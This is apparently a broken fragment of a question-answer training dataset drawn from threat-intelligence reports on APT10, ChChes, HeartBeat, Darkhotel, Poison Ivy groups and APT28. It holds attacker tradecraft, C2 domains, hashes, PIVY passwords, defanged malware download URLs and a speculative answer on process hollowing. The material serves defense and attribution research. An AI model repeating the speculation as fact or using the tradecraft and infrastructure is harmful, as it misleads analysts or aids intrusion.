dictate the growth of businesses in China and are, therefore, likely to also form part of Chinese companies' business strategies.\nThe latest FYP describes five principles which underpin China's goal of doubling its 2010 GDP by 2020. At the forefront of these principles is innovation, largely focused around technological innovation, with China expected to invest 2.5% of GDP in research and development to attain technological advances, which are anticipated to contribute 60% towards economic growth objectives.11 The areas of innovation expected to receive extensive investment include, next-generation communications, new energy, new materials, aerospace, biological medicine and smart manufacturing.\nIn addition to the FYP principle of innovation, China is also promoting ten key industries in which it wants to improve innovation in manufacturing as part of the 'Made in China 2025' initiative.12\nFigure 13: Industries of interest outlined by 'Made in China 2025' initiative\nObserved APT10 targeting is in line with many of the historic compromises we have outlined previously as originating from China. This targeting spans industries that align with China's 13th FYP which would provide valuable information to advance the domestic innovation goals held within China. Given the broad spectrum of priority industries, the compromise of MSPs represents an efficient method of information collection. This strategy also provides additional obfuscation for the actor as any data exfiltrated is taken back through the initial compromised company's systems, creating a much more difficult trail to follow.\n10 https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf\n11 https://www.pwccn.com/en/migration/pdf/govt-work-review-mar2016.pdf\n12 http://www.pwccn.com/en/migration/pdf/prosperity-masses-2020.pdf\nQ: What specific tactics does APT10 employ in its Japan-focused campaign to target Japanese organizations, and how do these tactics differ from its broader operations?",
    "output": "In its Japan-focused campaign, APT10 employs several specific tactics, including the use of bespoke malware referred to as 'ChChes', masquerading as legitimate Japanese public sector entities, and sending spear phishing emails with executable attachments designed to lure victims. The filenames associated with the malware samples are in Japanese, indicating a targeted campaign against Japanese-speaking individuals. Additionally, APT10 registers C2 domains that closely resemble legitimate Japanese organizations, further highlighting the tailored nature of this campaign compared to its broader operations.",

    "instruction": "Big Headline: Attribution\nClues relating to the attackers remain very limited. Using compromised hosts as C&C proxy servers minimizes the possibility of tracking potential threat actors. While a number of their campaign codes included Chinese words such as guohui, xuehui and minzhu, they appear to be comfortable using the English language. Some of the C&C domain names even contained English words. In addition, the binder tool and the RAT component are written in English. For instance, some text from the packaged components' body included \"Select Files!\" and \"Bind Success!\", while the RAT component included strings such as \"Uninstall\u2026ok\" and the name of the RAT itself, \"HeartBeat.\"\nThreat actors and entities that use collected information from targets may be two separate parties that are only related in a professional and malicious manner. In this case, determining the latter may be impossible. Likewise, it is very difficult to identify the threat actors behind the HeartBeat campaign given the limited amount of information available.\nBig Headline: ConClusion\nThe Heartbeat campaign has been successfully executing targeted attacks since 2009. In order for attackers to properly track their campaigns and victims, they used campaign codes that contained the campaign dates and strings that described specific campaigns. These campaign codes are embedded in their RAT binaries and were sent to their C&C servers along with information regarding the targets' system. Additionally, they used a commercial site redirection service for their C&C domains. These domains redirected to various IP addresses that belonged to legitimate ISPs, which may be compromised hosts that act as proxy servers. This effectively hides the real location of the attackers behind HeartBeat. While having an isolated target may have helped them stay under the security industry's radar, the attackers illustrated that they were very careful but persistent.\nUnderstanding targeted campaigns and their methodologies is fundamental in protecting both end users and organizations. Not only does it help in coming up with effective defensive strategies through multiple protection layers, it also helps with predicting possible targets in the future and ultimately, raise awareness. As of this writing, the HeartBeat APT campaign remains an active targeted campaign.\nBig Headline: timeline\nWe collected 19 set of samples related to HeartBeat campaign from November 2009 to June 2012. This translates to 19 campaigns where the vast majority of which were distributed between 2011 and 2012. Nonetheless, the limited number of samples we were able to obtain still means that the campaign is indeed persistent. The isolated nature of this targeted attack and its small user base may only require the HeartBeat perpetrators to carry out minimal campaigns in order to infiltrate their targets.\nWe did not obtain a campaign sample from 2010. However, we highly suspect that their operation was also active during that year. In fact, we can see in the second MD5 above that the sample was compiled in December 24, 2010. Also, it is possible that some of the campaign's attacks may not have been escalated to antivirus firms by infected users, or simply remains undiscovered.\nBig Headline: defending AgAinst the heArtbeAt CAmPAign\nEssential components of defense against the HeartBeat campaign are security-related policies within enterprises. Once an attack is identified, a good cleanup strategy should focus on determining the attack vector and cutting off communications with the C&C server. It is also vital to determine the scope of the compromise and assessing the damage through data analysis and forensics.\nThe following best practices are also advised:\n\u2022 Disable services that are related to the HeartBeat RAT component.\n\u2022 Enable system's firewall\n\u2022 Keep software and operating systems updated with latest patches released by vendors to address vulnerabilities and exploits.\n\u2022 Block unused ports to disallow malware from using these ports to communicate and/or enforce commands.\n\u2022 Monitor network connections for any suspicious connection or connectivity.\n\u2022 Regularly update list of sites that are trusted.\n\u2022 Configure your email server to block or remove email\nthat contain file attachments using extensions such as .VBS, .BAT, .EXE, .PIF and .SCR files.\n\u2022 Avoid opening email attachments and clicking embedded links from unknown sources\n\u2022 Block any file with more than one file type extension.\n\u2022 When a computer is compromised, isolate it immediately from the network.\n\u2022 Configure your system to show hidden files and folders and display file extensions.\n\u2022 Don't save login credentials on the local computer.\nBig Headline: trend miCro threAt ProteCtion AgAinst the heArtbeAt CAmPAign ComPonents\nThe following table summarizes the Trend Micro solutions for the components of the HeartBeat campaign. Trend Micro recommends a comprehensive security risk management strategy that goes further than advanced protection to meet the real-time threat management requirements of dealing with targeted attacks.\nThe \"HeartBeat\" campaign has been persistently pursuing government agencies since 2009. The samples collected related to this campaign covered attacks seen from November 2009 to June 2012, although majority of the attacks were seen in 2011 and 2012.\n\u2022\t Victims\tand\tTargets\nAPT campaigns target specific industries or communities of interest in specific regions.\nThe HeartBeat campaign targets South Korean government organizations and institutions like political parties, media outfits, a national policy research institute, a military branch of South Korean armed forces, a small business sector organization, and branches of the South Korean government.\n\u2022\t Operations\nThe 1st-stage computer intrusions often use social engineering. Attackers custom-fit attacks to their targets.\nThe threat actors behind HeartBeat install a RAT in system. The RAT arrives as a disguised or fake document which is actually a bundled file. The bundled file contains both a decoy document and the RAT installer that has been packaged together using a binder tool. The campaign's decoy documents used the file formats .JPG, .PDF, XLS, and HWP, the Korean government standard word processor format.\n\u2022\t Possible\tIndicators\tof\tCompromise\nAttackers want to remain undetected as long as possible. A key characteristic of these attacks is stealth.\nThe following indicators suggest an infection by the HeartBeat campaign: contiguous 02H bytes communication in the network, the presence of certain files and registries as detailed in the paper, and network connections to certain IPs and domains, including the presence of files detected as TROJ_DRPBEAT and BKDR_HBEAT.\n\u2022\t Relationship\twith\tother\tAPT\tCampaigns\nThis attack does not seem to have any relationship with other APT campaigns.\nMedium Headline: TREND MICRO INCORPORATED\nTrend Micro Incorporated (TYO: 4704; TSE: 4704), a global cloud security leader, creates a world safe for exchanging digital information with its Internet content security and threat management solutions for businesses and consumers.

The targeted emails, which impersonate existing persons, are sent from free email address services available in Japan. Also, the executable files' icons are disguised as Word documents. When the recipient executes the file, the machine is infected with malware called ChChes.\nThis blog article will introduce characteristics of ChChes, including its communication.\nBig Headline: ZIP files attached to Targeted Emails\nWhile some ZIP files attached to the targeted emails in this campaign contain executable files only, in some cases they also contain dummy Word documents. Below is the example of the latter case.\nFigure 1: Example of an attached ZIP file\nIn the above example, two files with similar names are listed: a dummy Word document and an executable file whose icon is disguised as a Word document. By running this executable file, the machine will be infected with ChChes. JPCERT/CC has confirmed the executable files that have signatures of a specific code signing certificate. The dummy Word document is harmless, and its contents are existing online articles related to the file name \"Why\nDonald Trump won\". The details of the code signing certificate is described in Appendix A.\nBig Headline: Communication of ChChes\nChChes is a type of malware that communicates with specific sites using HTTP to receive commands and modules. There are only few functions that ChChes can execute by itself. This means it expands its functions by receiving modules from C&C servers and loading them on the memory.\nThe following is an example of HTTP GET request that ChChes sends. Sometimes, HEAD method is used instead of GET.\nAccept: */*\nUser-Agent: [user agent]\nHost: [host name]\nConnection: Keep-Alive\nCache-Control: no-cache\nAs you can see, the path for HTTP request takes /[random string].htm, however, the value for the Cookie field is not random but encrypted strings corresponding to actual data used in the communication with C&C servers. The value can be decrypted using the below Python script.\nThe following is the flow of communication after the machine is infected.\nFigure 2: Flow of communication\nBig Headline: The First Request\nThe value in the Cookie field of the HTTP request that ChChes first sends (Request 1) contains encrypted data starting with 'A'. The following is an example of data sent.\nFigure 3: Example of the first data sent\nAs indicated in Figure 3, the data which is sent contains information including computer name. The format of the encrypted data differs depending on ChChes's version. The details are specified in Appendix B.\nAs a response to Request 1, ChChes receives strings of an ID identifying the infected machine from C&C servers (Response 1). The ID is contained in the Set-Cookie field as shown below.\nFigure 4: Example response to the first request\nBig Headline: Request for Modules and Commands\nNext, ChChes sends an HTTP request to receive modules and commands (Request 2). At this point, the following data starting with 'B' is encrypted and contained in the Cookie field.\nB[ID to identify the infected machine]\nAs a response to Request 2, encrypted modules and commands (Response 2) are sent from C&C servers. The following shows an example of received modules and commands after decryption.\nFigure 5: Decrypted data of modules and commands received\nCommands are sent either together with modules as a single data (as above), or by itself. Afterwards, execution results of the received command are sent to C&C servers, and it returns to the process to receive modules and commands. This way, by repeatedly receiving commands from C&C servers, the infected machines will be controlled remotely.\nJPCERT/CC's research has confirmed modules with the following functions, which are thought to be the bot function of ChChes.\nEncrypt communication using AES\nExecute shell commands\nUpload files\nDownload files\nLoad and run DLLs\nView tasks of bot commands\nEspecially, it was confirmed that the module that encrypts the communication with AES is received in a relatively early stage after the infection. With this feature, communication with C&C servers after this point will be encrypted in AES on top of the existing encryption method.\nBig Headline: Appendix A: Code signing certificate\nThe code signing certificate attached to some samples are the following:\nData:\nVersion: 3 (0x2)\nSerial Number:\n3f:fc:eb:a8:3f:e0:0f:ef:97:f6:3c:d9:2e:77:eb:b9\nSignature Algorithm: sha1WithRSAEncryption\nIssuer: C=US, O=VeriSign, Inc., OU=VeriSign Trust Network, OU=Terms of use at https://www.verisign.com/rpa (c)10, CN=VeriSign Class 3 Code Signing 2010 CA\nValidity\nNot Before: Aug 5 00:00:00 2011 GMT\nNot After : Aug 4 23:59:59 2012 GMT\nSubject: C=IT, ST=Italy, L=Milan, O=HT Srl, OU=Digital ID Class 3 -\nMicrosoft Software Validation v2, CN=HT Srl\nSubject Public Key Info:\n(Omitted)\nFigure 6: Code signing certificate\n\nHow does ChChes malware communicate with its Command and Control (C&C) servers, and what role do cookie headers play in this communication?",

While Night Dragon attacks focused specifically on the energy sector, the tools and techniques of this kind can be highly successful when targeting any industry. Our experience has shown that many other industries are currently vulnerable and are under continuous and persistent cyberespionage attacks of this type. More and more, these attacks focus not on using and abusing machines within the organizations being compromised, but rather on the theft of specific data and intellectual property. It is vital that organizations work proactively toward protecting the heart of their value: intellectual property. Enterprises need to take action to discover these assets in their environments, assess their configurations for vulnerabilities, and protect them from misuse and attack.\nFor additional research and information, review Hacking Exposed: Network Secret and Solutions\u20146th Edition (Osborne McGraw-Hill).

    "output": "McAfee Application Control prevents the Night Dragon attack by stopping the dropper files from executing, even if executed by an administrator on Windows. This prevents the download of additional malware and the setup of Command and Control (C&C) channels, which are essential for Remote Administration Tool (RAT) control and theft of sensitive files. McAfee Configuration Control disallows any configuration changes to systems, protecting them from being modified without explicit permission, even with administrative access. This ensures that the system remains secure and unaltered by the attack.",

    "instruction": "Big Headline: Executive Summary\nThe Darkhotel ApT is a threat actor possessing a seemingly inconsistent and contradictory set of characteristics, some advanced and some fairly rudimentary. inhospitably operating for almost a decade, the threat actor is currently active. The actor's offensive activity can be tied to specific hotel and business center Wi-fi and physical connections, some of it is also tied to p2p/file sharing networks, and they have been known to spear-phish targets as well. Darkhotel tools are detected as \"Tapaoux\", \"pioneer\", \"Karba\", and \"Nemim\", among other names. The following list presents a set of characteristics for the crew:\n\u2022 operational competence to compromise, mis-use, and maintain access to global scale,  trusted commercial network resources with strategic precision for years\n\u2022 advanced mathematical and crypto-analytical offensive capabilities, along with no regard for undermining the trust extended to the Certificate Authorities and the pKi\n\u2022 indiscriminately infect systems with some regional clarity over trusted and untrusted resources to build and operate large botnets\n\u2022 well-developed low level keyloggers within an effective and consistent toolset\n\u2022 a focus throughout campaigns on specific victim categories and tagging them\n\u2022 a larger, dynamic infrastructure built of apache webservers, dynamic dns records, crypto libraries, and php webapps\n\u2022 regular 0-day access - recent deployment of an embedded Adobe flash 0-day spear-phishing exploit, and infrequent deployment of other 0-day resources to sustain larger campaigns over several years\nSmall Headline: Hotels and Business Centers Spread\nThe Darkhotel ApT's precise malware spread was observed in several hotels' networks, where visitors connecting to the hotel's Wi-fi were prompted to install software updates to popular software packages.\nof course, these packages were really installers for Darkhotel ApT's backdoors, added to legitimate installers from Adobe and Google. Digitally signed Darkhotel backdoors were installed alongside the legitimate packages.\nThe most interesting thing about this delivery method is that the hotels require guests to use their last name and room number to login, yet only a few guests received the Darkhotel package. When visiting the same hotels, our honeypot research systems couldn't attract a Darkhotel attack. This data is inconclusive, but it points to misuse of check-in information.\nSmall Headline: Abusing Network infrastructure\nThe Darkhotel actor maintained an effective intrusion set at hotel networks, providing ample access to unexpected points of attack over several years. These staging points also provide the attackers with access to check-in/check-out and identity information of visitors to high-end and luxury hotels.\nAs a part of an ongoing investigation, our research led us to embedded iframes within hotel networks that redirected individuals' web browsers to phony installers. The attackers were very careful with the placement of these iframes and executables on trusted resources - the hotels' network login portals themselves. The attackers were also very careful to immediately delete all traces of their tools as soon as an attack was carried out successfully. Those portals are now reviewed, cleaned and undergoing a further review and hardening process. We observed traces of a couple of these incidents in late 2013 and early 2014 on a victim hotel's network. The attackers set up the environment and hit their individual targets with precision. As soon as their target's stay was over and the attack-frame was closed, the attackers deleted their iframe placement and backdoored executables from the hotel network. The attackers successfully deleted traces of their work from earlier attacks in another hotel, but their offensive techniques were the same. outside reports of the same activity at other hotels provide enough data to confirm the same careful operations there.\nThe attack technique blurs the line between a couple of common ApT tactics; fairly inaccurate \"watering holes\" or \"strategic web compromises\" and more accurate spearphishing techniques. in this case, the Darkhotel attackers wait for their victim to connect to the internet over the hotel Wi-fi or the cable in their room. There is a very strong likelihood the targets will connect over these resources, and the attackers rely on that likelihood, much like at a watering hole. But the attackers also maintain truly precise targeting information over the victim's visit, much like they would know a victim's email address and content interests in a spearphishing attack. While setting up the attack, the Darkhotel attackers knew the target's expected arrival and departure times, room number, and full name, among other data. This data enables the attackers to present the malicious iframe precisely to that individual target. So, here we have yet another unique characteristic of this attacker - they employ a loosely certain but highly precise offensive approach.\nSmall Headline: indiscriminate Spread\nAn example of the Darkhotel ApT's indiscriminate malware spreading is demonstrated by the way it seeds Japanese p2p sharing sites, where the malware is delivered as a part of a large (approximately 900mb) rar archive. The archive is also spread over bittorrent, as detailed below. Darkhotel uses this method to distribute their Karba Trojan. These Japanese archives, translated for Chinese speaking viewers, appear to be sexual in nature, part of an anime sex/military comic scene, exposing the likely interests of potential targets.\nThis Darkhotel package was downloaded over 30,000 times in less than six months. The p2p bittorrent Darkhotel offering is listed here, posted on 2013.11.22. it was spread throughout 2014.\n(\u4e00\u822c\u30b3\u30df\u30c3\u30af) [\u53e4\u5473\u76f4\u5fd7] \u30cb\u30bb\u30b3\u30a4 \u7b2c0109\u5dfb.rar\nThis torrent serves up an almost 900 mb file. The rar archive decompresses to a directory full of encrypted zips, the associated decryptor and a password file for decrypting the zips. But what looks like the AxDecrypt.exe decryptor is bound to both the true decryptor and the dropper for the Darkhotel Catch.exe Karba Trojan. When a user downloads the torrent and decrypts the zip files, the trojan surreptitiously is installed and run on the victim system.\nCatch.exe, detected as Backdoor.Win32.Agent.dgrn, communicates with the following Darkhotel command and control servers:\nmicrodelta.crabdance.com  microyours.ignorelist.com  micronames.jumpingcrab.com  microchisk.mooo.com  microalba.serveftp.com\nother examples of this Darkhotel backdoor bound within a shared torrent include adult content Japanese anime and more. There are tens of thousands of downloads of these individual torrents.\nand\nThe associated Darkhotel backdoor was hosted on bittorrent, emule, etc, under a variety of comic names. Examples include comics and anime offerings. Related Darkhotel command and control server domains include:\nmicroblo5.mooo.com  microyours.ignorelist.com  micronames.jumpingcrab.com  microchisk.mooo.com  microalba.serveftp.com\nSmall Headline: Darkhotel Spear-phishing Campaigns\nDarkhotel campaigns involving typical spear-phished Tapaoux implants publicly appeared in bits and pieces several times over the past five years. These subproject efforts targeted defense industrial base (DiB), government, and NGo organizations. Email content on topics like nuclear energy and weaponry capabilities was used as a lure. Early accounts were posted on  describing attacks on NGo organizations and government policy makers. This spear-phishing activity continues into 2014. The attacks follow the typical spear-phishing process and in the past couple of months, exploited systems retrieved downloader executables from web servers like hxxp://officerevision.com/update/files22/update.exe or hxxp://tradeinf.com/mt/ duspr.exe\nover the past few years the group has emailed links that redirect targets' browsers to internet Explorer 0-day exploits. Sometimes the attachment itself includes an Adobe 0-day exploit.\nSmall Headline: Recent 0-day Deployment\nThis crew occasionally deploys 0-day exploits, but burns them when required. in the past few years, they deployed 0-day spear-phishing attacks targeting Adobe products and Microsoft internet Explorer, including cve20100188. in early 2014, our researchers exposed their use of cve20140497, a flash 0-day described on (<http://securelist.com/blog/incidents/58244/cve-2014-0497-a-0-day-vulnerability/>)Securelist in early february.\nThe crew spear-phished a set of target systems connected to the internet through Chinese iSps, and developed capabilities within the 0-day exploits to handle hardened Windows 8.1 systems. it's interesting that the flash objects were embedded in Korean documents titled \"list of the latest Japanese AV wind and how to use torrents.docx\" (loose English translation). The dropped downloader (d8137ded710d83e2339a97ee78494c34) delivered malcode similar to the \"information Stealer\" component functionality summarized below, and detailed in Appendix D.\nRead the text above and answer this question: How does the Darkhotel APT deploy 0-day exploits in their attacks? Provide an example of a recent deployment and explain the significance of their approach.",

    "instruction": "Write an answer to the following question: How could the threat actors behind the Sea Turtle campaign potentially utilize Process Injection: Process Hollowing to evade detection and maintain persistence in the targeted networks?",
    "output": "Process Injection: Process Hollowing is a technique used by adversaries to inject malicious code into suspended and hollowed processes, allowing them to evade process-based defenses. In the context of the Sea Turtle campaign, the threat actors demonstrated a high level of sophistication and ability to adapt to various security measures. One potential way they could utilize Process Injection: Process Hollowing is by creating a legitimate process on a compromised system, suspending it, and then unmapping its memory to replace it with malicious code. This would enable them to execute arbitrary code in the address space of a separate live process, potentially evading detection from security products. Furthermore, since the injected process would inherit the security context of the injecting process, it would likely not result in elevated privileges, but it would still allow the threat actors to maintain persistence in the targeted network. Given the threat actors' ability to impersonate VPN applications and perform MitM attacks, it is possible that they could use Process Injection: Process Hollowing to inject malicious code into legitimate processes, making it even more challenging for security products to detect their activities.",

    "instruction": "Medium Headline: Clustering\nTo cluster the activity of specific APT campaigns across our PIVY sample set, we first grouped the PIVY samples by common CnC infrastructure. Using passive DNS, we clustered the domain names used by the common IP address to which\nthey resolved. Because attackers may park their domains by pointing to IP addresses that they do not necessarily control (and to account for other possible anomalies in passive DNS data), we layered additional indicators extracted from the samples, such as PIVY passwords, mutexes, campaign \"marks/codes,\"26 and launcher information.27 From our data set, we focused on three separate APT campaigns and corresponding threat actors identified by the PIVY password used in subsequent attacks:\n\u2022 admin@338\n\u2022 th3bug\n\u2022 menuPass\nEach of these campaigns is detailed in the corresponding sections.\nTable 3: Common PIVY passwords seen in PIVY variants attributed to APT attacks\n25 A mutex is a Windows object used for inter-process synchronization. They are often used by malware to ensure only one instance of the malware is running     on an infected system at a given time.\n26 A campaign mark/code is typically a string designated by a threat actor that is often included as part of the malware communication and/or embedded within the malware binaries. It is used to identify targeted attack campaigns against a set number of targets (usually by industry), so the threat actor can keep attacks organized.\n27 Launchers are malware built specifically to load other malware (payload), often by decrypting the payload and injecting it into a host process on the target's endpoint.\nTo triangulate the timing (when the sample was likely used), we used the portable executable (PE) compile time extracted from the PIVY samples and the date each sample appeared first appeared in a malwareanalysis services such as VirusTotal. Each of these APT campaigns has been active from 2008 through 2013.\nMedium Headline: Campaign 1: admin@338\nOur data set for the admin@338 threat actor contains the following:\n\u2022 21 Poison Ivy samples\n\u2022 3 passwords\n\u2022 43 CnC servers\nThe earliest admin@338 PIVY sample we have dates to December 27, 2009. But we believe that this campaign was active as early as January 7, 2008, using other PIVY passwords (key@123 and gwx@123). This ongoing campaign tends to target the finance, economic, and trade policy but we see significant activity in the ISP/telco, government, and defense sectors as well.\nFigure 9: Percent of admin@338 APT group attacks by industry\nSmall Headline: Attack vector\nThe preferred attack vector used by this campaign is spear-phishing emails. Using content that is relevant to the target, these emails are designed to entice the target to open an attachment that contains the malicious PIVY server code.\nThe content of the spear-phishing emails and the decoy documents opened after exploitation tend to be in English\u2014although the character set of the email message body in Figure 10 is actually Chinese (character set GB2312).28\nFigure 10: Example spear-phishing email launched by the admin@338 APT group\n28 Wikipedia. \"GB 2312.\" February 2013.\nSmall Headline: Clustering\nIn addition to the PIVY password admin@338, we clustered individual attacks by using passive DNS data to look at the IP addresses the CnC servers have resolved to over time. We found that common IP addresses among PIVY samples for admin@338, key@123 and gwx@123.\nFigure 11: GB2312 encoding in spear-phishing email launched by the admin@338 APT group\n29 National Institute of Standards and Technology. \"Vulnerability Summary for CVE-2012-0158.\" April 2012.\n30 National Institute of Standards and Technology. \"Vulnerability Summary for CVE-2009-4324.\" December 2009.\nWe can link PIVY passwords key@123 with admin@338 by observing the following connections:\n\u2022 The key@123 sample, 808e21d6efa2884811fbd0adf67fda78, connects directly to 219.76.208.163.\n\u2022 Two CnC domain names from the admin@338 sample 8010cae3e8431bb11ed6dc9acabb93b7, www.webserver.dynssl.com and www. webserver.freetcp.com, resolved to that same IP address (219.76.208.163).\nWe can link PIVY passwords gwx@123 with admin@338 by observing the following connections:\n\u2022 The gwx@123 sample 0323de551aa10ca6221368c4a73732e6 connects to the CnC domain names microsofta. byinter.net, microsoftb.byinter.net, microsoftc. byinter. net, and microsofte.byinter.net.

Instead, attacks attributed to th3bug use a strategic Web compromise to infect targets. This approach is more indiscriminate, which probably accounts for the more disparate range of targets.\nIn the FireEye blog, we documented a recent th3bug strategic Web compromise.31\nIn the following example, the actor or actors behind the th3bug campaign compromised multiple websites that catered to the intended targets. The attacker used injected JavaScript on the compromised websites to redirect targets to an Internet Explorer exploit that dropped Stage 1 launcher/downloader mobile code. This downloader then retrieved and installed a PIVY RAT variant.\n31 Thoufique Haq and Yasir Khalid. \"Internet Explorer 8 Exploit Found in Watering Hole Campaign Targeting Chinese Dissidents.\" March 2013.\nSmall Headline: Weaponization\nIn related campaigns, th3bug has used a number of different Java and Internet Explorer exploits, including (CVE-2013-0422),32 (CVE-2013-1347),33 and (CVE-2011-3544).34\nFigure 17: Example of ROP exploit code used by th3bug APT group\nFigure 18: Cluster intel of the th3bug APT group\n32 National Institute of Standards and Technology. \"Vulnerability Summary for CVE-2013-0422.\" February 2013.\n33 National Institute of Standards and Technology. \"Vulnerability Summary for CVE-2013-0422.\" January 2013.\n34 National Institute of Standards and Technology. \"Vulnerability Summary for CVE-2011-3544.\" October 2011.\nThe default PIVY password of admin has been used by multiple, distinct threat actors\u2014so clearly, we cannot link all PIVY samples with the admin password to th3bug. But evidence suggests that the attackers originally used the default password before settling on th3bug. We can link at least one PIVY sample that uses the admin password to the th3bug campaign based on the following connections:\n\u2022 The sample 8002debc47e04d534b45f7bb7dfcab4d connected to kr.iphone.qpoe.com with the PIVY password admin.\n\u2022 The domain kr.iphone.qpoe.com resolved to 180.210.206.96 on January 12, 2012.\n\u2022 The domain nkr.iphone.qpoe.com also resolved to 180.210.206.96 on January 3, 2012.\n\u2022 The domain nkr.iphone.qpoe.com also resolved to 101.78.151.179 on December 23, 2011.\n\u2022 The domain e.ct.toh.info resolved to 101.78.151.179 on June 12, 2012.\n\u2022 The sample 55a3b2656ceac2ba6257b6e39f4a5b5a connected to ct.toh.info domain with the PIVY password th3bug.\nWe found a smaller number of distinct PIVY samples linked to th3bug than we did for the admin@338 and menuPass campaigns. This paucity is likely a result of two factors.\nFirst, th3bug does not appear to stage a high volume of attacks. Instead, it appears to run only a handful of strategic Web compromise attacks each year. Second, th3bug stages its delivery of PIVY.\nSo to acquire the second-stage PIVY server payload, an attack must be observed in real time.\nFigure 19: Partial cluster intel of the th3bug APT group (zoomed in)\nMedium Headline: Campaign 3: menuPass\nOur data set for the menuPass threat actor comprises the following:\n\u2022 118 Poison Ivy samples\n\u2022 8 passwords\n\u2022 61 domains\n\u2022 74 IP addresses\nThe earliest menuPass PIVY sample we have is dated December 14, 2009. This sample (b08694e14a9b966d8033b42b58ab727d) connected to a control server at js001.3322.org with a password xiaoxiaohuli (Chinese translation: \"little little fox\"). Based on what we have found, it appears that the threat actor behind menuPass prefers to target U.S. and foreign defense contractors.\nFigure 20: Percent of menuPass APT group attacks by industry\nQ: What methods were used to triangulate the timing of when a PIVY sample was likely used in an attack? Why were these methods effective?",
    "output": "To triangulate the timing of when a PIVY sample was likely used, the researchers used the portable executable (PE) compile time extracted from the PIVY samples and the date each sample first appeared in malware analysis services such as VirusTotal. These methods were effective because they provided a historical record of when the malware was compiled and when it was first detected, helping to establish a timeline for the attacks.",

Our research and observations suggest that this targeting continues to date.\nDuring the 2013 \u2013 2014 period there was a general downturn in the threat actor's activities, as was also seen with other related groups. It was widely assessed that this was due to the public release of information surrounding APT1, which exposed its toolset and infrastructure.\nFrom our analysis and investigations, we have identified APT10 as actively operating at least two specific campaigns, one targeting MSPs and their clients, and one directly targeting Japanese entities.\n\nBased on the above text, answer a question. How did the public exposure of APT1's toolset and infrastructure impact APT10's activities during the 2013 \u2013 2014 period, and what changes in targeting strategies were observed subsequently?",
    "output": "The public exposure of APT1's toolset and infrastructure led to a general downturn in APT10's activities during the 2013 \u2013 2014 period, similar to other related groups. This downturn was likely due to increased scrutiny and awareness following the exposure. Subsequently, APT10 was identified as actively operating at least two specific campaigns: one targeting Managed Service Providers (MSPs) and their clients, and another directly targeting Japanese entities. These campaigns indicate a shift in targeting strategies, expanding beyond the group's traditional focus on government and US defense industrial base organizations.",

    "output": "The list of hashes provided represents unique identifiers for various files or pieces of data related to the activities of the Black Vine cyberespionage group. These hashes can be crucial in forensic analysis for several reasons. Firstly, they can be used to identify specific malware or tools employed by Black Vine, allowing security analysts to track the spread and impact of these tools across different systems. Secondly, by comparing these hashes with known malicious files, analysts can determine if other systems have been compromised by the same attack vectors. Additionally, the hashes can serve as indicators of compromise (IOCs), helping organizations to detect and respond to potential threats more effectively. By analyzing the hashes, security professionals can gain insights into the group's TTPs, such as the types of malware they develop and deploy, and the methods they use to infiltrate and exfiltrate data from target networks.",

    "instruction": "Context: Small Headline: Safe attachments\nUsing a real-time security software product from a reputable vendor and keeping the detection signatures up-to-date remains one of the best ways individuals and organizations can protect themselves against most of the threats they face. Antimalware software relies predominately on detection signatures written to target specific malicious binaries, or groups of closely related threats that can be detected heuristically. This approach can be a very effective defense against most malware, which attackers typically try to distribute widely in order to compromise large numbers of computers for their purposes. Unfortunately, conventional antimalware software is often less effective against targeted attacks mounted by groups such as STRONTIUM (see page (<>)3). These groups, which focus on targeting computers at specific institutions, often use specially crafted threats that they test against popular antimalware solutions ahead of time to\nensure that they will not be detected. By the time detection signatures are available to stop such a threat, it may have already compromised the organization.\nExchange Online Advanced Threat Protection adds a new layer of defense against email-borne threats that uses behavioral analysis to detect incoming files that may be harmful, and blocks them before they can reach their intended recipients. When an incoming message includes a potentially dangerous attached file, Exchange Online launches it in a detonation chamber\u2014a virtual sandboxed environment in which potential threats can run without posing harm to any other resources\u2014and monitors it for malicious behavior such as suspicious registry changes, attempts to access memory dumps, changes to executables, and other actions that malware characteristically takes. This monitoring makes it possible to detect and block threats that have never been seen before and for which no detection signatures are available. Exchange Online Advanced Threat Protection includes anti-sandbox detection features such as vulnerability detection to combat advanced threats that avoid taking malicious actions when they determine they are being run in a virtual machine.\nFigure 74. Exchange Online Advanced Threat Protection notifies administrators when malware is detected\nAdministrators can configure how Exchange Online reacts when it determines that an attachment contains malware. Exchange Online can be configured to block delivery of the message, notify administrators, and include a copy of the blocked message so they can analyze it themselves and determine whether additional action is necessary. The process of analyzing a message typically takes about four to five minutes; administrators can set a 30 minute time limit for\nanalysis, after which the message will either be delivered or blocked, as administrators see fit.\nFigure 75. Types of malicious files blocked by Exchange Online Advanced Threat Protection over a two-month period in 2015\nSafe links\nIn addition to sending malware to recipients directly, attackers often send email messages that contain links to malware or drive-by download pages, in hopes that the recipients will click the links and become infected. To provide protection against malicious links, administrators can configure Exchange Online Advanced Threat Protection to rewrite any links in incoming messages to proxy through the Exchange Online service. When a user clicks on a rewritten link, Exchange Online checks the intended destination URL against its database of malicious URLs. If the URL is not determined to be malicious, the user is quickly and seamlessly redirected to their intended destination. If the URL is determined to be malicious, a blocking page is displayed instead. Exchange Online Advanced Threat Protection checks each URL at the time the link is clicked, which means it can protect users from malicious links that were not known to be malicious at the time the message was originally sent.\nFigure 76. Exchange Online Advanced Threat Protection blocks malicious links in email messages\nExchange Online Advanced Threat Protection can be configured to track when users clicks malicious links to help administrators monitor potential targeted attacks and determine which computers may have been exposed to malware. Customers with privacy or compliance concerns can disable the link tracking feature.\nAdvanced Threat Protection is available for subscribers of select Exchange or Office 365 plans for an additional small per-user fee.

These victims would provide the Russian government with an ability to predict policymaker intentions and gauge its ability to influence public opinion.\nAPT28 appeared to target individuals affiliated with European security organizations and global multilateral institutions. The Russian government has long cited European security organizations like NATO and the OSCE as existential threats, particularly during periods of increased tension in Europe.\nBig Headline: Malware compile times suggest that APT28 developers have consistently updated their tools over the last seven years.\nSince 2007, APT28 has systematically evolved its malware, using flexible and lasting platforms indicative of plans for long-term use. The coding practices evident in the group's malware suggest both a high level of skill and an interest in complicating reverse engineering efforts.\n\u2022 Malware compile times suggest that APT28 developers have consistently updated their tools over the last seven years.\n\u2022 APT28 malware, in particular the family of modular backdoors that we call CHOPSTICK, indicates a formal code development environment.  Such an environment would almost certainly be required to track and define the various modules that can be included in the backdoor at compile time.\n\u2022 APT28 tailors implants for specific victim environments.  They steal data by configuring their implants to send data out of the network using a victim network's mail server.\n\u2022 Several of APT28's malware samples contain counter-analysis capabilities including runtime checks to identify an analysis environment, obfuscated strings unpacked at runtime, and the inclusion of unused machine instructions to slow analysis.\nMedium Headline: Indicators in APT28's malware suggest that the group consists of Russian speakers operating during business hours in Russia's major cities.\nMore than half of the malware samples with Portable Executable (PE) 